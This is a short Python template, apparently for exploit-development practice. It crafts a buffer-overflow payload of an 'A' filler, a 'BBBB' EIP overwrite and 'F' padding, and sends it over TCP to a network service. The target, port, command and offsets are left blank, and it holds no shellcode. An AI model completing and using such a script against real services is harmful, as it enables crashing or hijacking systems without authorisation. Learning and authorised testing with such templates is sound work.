#!/usr/bin/python3

import socket

dest = ''
dport = 
cmd = ''
total_bytes =
distance_to_eip = 
end = '\r\n'
# The variables belows most likely don't need changed
buffer_to_eip = distance_to_eip * 'A'
eip_overwrite = 'BBBB'
padding = 'F' * (total_bytes - distance_to_eip - len(eip_overwrite))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((dest, dport))
s.recv(100)
s.sendall((cmd + buffer_to_eip + eip_overwrite + padding + end).encode())
print(s.recv(100))
s.close()
